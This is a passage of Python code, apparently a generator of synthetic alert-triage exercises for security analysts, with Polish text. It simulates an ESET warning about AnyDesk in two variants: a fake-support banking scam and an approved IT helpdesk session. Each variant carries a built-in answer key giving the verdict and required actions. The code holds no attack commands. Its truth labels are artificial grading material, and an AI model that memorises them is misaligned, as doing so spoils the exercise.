                         bytes_in=rng.randint(6_000_000, 11_000_000), rule="LAN-to-Internet", app="anydesk", host=p.host)).key(
                "Duży ruch przychodzący do stacji przez 30 minut z relay AnyDesk: trwa zdalna sesja z wyświetlaniem ekranu." if i == 0 else
                "Kontynuacja sesji zdalnej.")
        b.add(src.proxy(b.t(-8), p.ip, p.sam, "GET", "https://bank-online.example/transfer/new", 200, 900, 61_000, category="Financial Services", host=p.host)).key(
            "W trakcie sesji zdalnej otwarto stronę przelewów bankowości. Typowy scenariusz oszustwa na „pracownika banku”.")
        trigger = b.add(src.eset(b.t(0), p.host, p.netbios, "Win32/RemoteAdmin.AnyDesk.A potentially unsafe application", "potentially unsafe application",
                                 "file", exe_pf, sha1, "none", False, "AnyDesk.exe", "Real-time file system protection", severity="Warning",
                                 reputation="Good", popularity="Common"))
        trigger.herring("ESET klasyfikuje AnyDesk tylko jako PUA (Warning), z reputacją „dobry”: to nie jest wirus. Złośliwe jest tu użycie, nie plik.")
        b.ti_threat(remote, tags="fake support site, remote access scam")
        noise(b, involved=[p])
        truth = b.truth(
            "tp", "high",
            f"Użytkownik księgowości zainstalował AnyDesk z fałszywej strony {domain}, ustawił dostęp nienadzorowany, a przez pół godziny trwała sesja zdalna, w czasie której otwarto bankowość. "
            "To oszustwo typu „fałszywy support/bank”.",
            f"TP. {p.host} ({p.sam}, księgowość): AnyDesk pobrany z {domain}, instalacja z autostartem i hasłem unattended, sesja przez relay (~30 min, duży ruch przychodzący), "
            "w tym czasie bank-online/transfer. Brak zgłoszenia w helpdesku. Eskaluję do L2 jako pilne, wnoszę o izolację hosta, telefon do użytkownika i do banku (blokada przelewów).",
            required=["isolate_host", "notify_user", "block_ioc"], lookups=[f"ti:{domain}", f"user:{p.sam}"])
    else:
        b.at_hour(rng.choice([10, 11, 13, 14]))
        p = b.person("IT")
        b.ctx.assets[p.host.lower()]["Uwagi"] = "Zatwierdzone oprogramowanie: AnyDesk (licencja firmowa, alias nordwind-it). Helpdesk."
        sess = b.session(p)
        user = w.person("Sprzedaż")
        ev, ad = b.spawn(sess["explorer"], exe_pf, f'"{exe_pf}"', b.t(-6), p.host, p.sam, signer="AnyDesk Software GmbH", sha256=sha256, cwd=r"C:\Program Files (x86)\AnyDesk")
        ev.key("AnyDesk w Program Files, podpisany. To zatwierdzone narzędzie helpdesku na stacji pracownika IT.")
        b.add(src.sysmon_net(b.t(-5.5), p.host, p.netbios, exe_pf, ad.pid, relay_ip, 443, relay, src_ip=p.ip))
        for i in range(0, 14, 4):
            b.add(src.fw(b.t(-5 + i), "allow", "tcp", p.ip, rng.randint(49152, 60000), relay_ip, 443, bytes_out=rng.randint(60_000, 200_000),
                         bytes_in=rng.randint(500_000, 2_000_000), rule="LAN-to-Internet", app="anydesk", host=p.host))
        b.change(p.host, b.t(-30), b.t(60), f"INC-21044: zdalna pomoc dla {user.display} ({user.host}), konfiguracja Outlooka. Wykonawca: {p.sam}", "INC-21044")
        trigger = b.add(src.eset(b.t(0), p.host, p.netbios, "Win32/RemoteAdmin.AnyDesk.A potentially unsafe application", "potentially unsafe application",
                                 "file", exe_pf, sha1, "none", False, "AnyDesk.exe", "Real-time file system protection", severity="Warning",
                                 reputation="Good", popularity="Common"))
        trigger.herring("Detekcja PUA na narzędziu zdalnego dostępu. Z zasady zasadna, ale tu dotyczy zatwierdzonego narzędzia IT.")
        b.ti_good(sha256, "hash", owner="AnyDesk Software GmbH", hosts_seen=11, note="Zatwierdzone narzędzie helpdesku, instalacja firmowa.")
        noise(b, involved=[p])
        truth = b.truth(
            "btp", "info",
            f"ESET zgłasza zdalne narzędzie, które w tym przypadku jest firmowym narzędziem helpdesku używanym przez {p.sam} w ramach zgłoszenia INC-21044.",
            f"BTP. {p.host} ({p.sam}, helpdesk IT): AnyDesk z Program Files, podpis poprawny, narzędzie na liście zatwierdzonej, sesja zgodna z INC-21044. "
            "Zamykam, wnoszę o wyjątek w polityce PUA dla stacji IT (close_tune).",
            lookups=[f"asset:{p.host}", f"change:{p.host}"])
    b.finish(trigger, source="ESET PROTECT", rule=f"Detection: {trigger.fields['Detection']}", severity="medium",
             description=f"ESET wykrył potencjalnie niebezpieczną aplikację na hoście {p.host}.", truth=truth, lessons=LESSONS_REMOTE,
             file=_remote_file(variant, p, exe_pf, sha256))


def _remote_file(variant: str, p, exe: str, sha256: str) -> dict:
    return {
        "name": "AnyDesk.exe", "path": exe if variant == "btp" else rf"{p.profile}\Downloads\AnyDesk.exe", "size": "3.9 MB", "sha256": sha256,
        "type": "PE32 (narzędzie zdalnego dostępu)", "signature": "Ważny podpis: AnyDesk Software GmbH",
        "mark_of_the_web": "-" if variant == "btp" else "ZoneId=3, pobrane z domeny spoza oficjalnej strony producenta",
        "org_prevalence": "Widziany na 11 hostach (IT)" if variant == "btp" else "Widziany na 1 hoście",
        "sandbox_verdict": "Legalne narzędzie (ryzyko zależy od użycia)",
        "behaviors": ["Nasłuchuje na połączenia przychodzące przez relay", "Może zostać skonfigurowane z hasłem do dostępu nienadzorowanego"],
    }

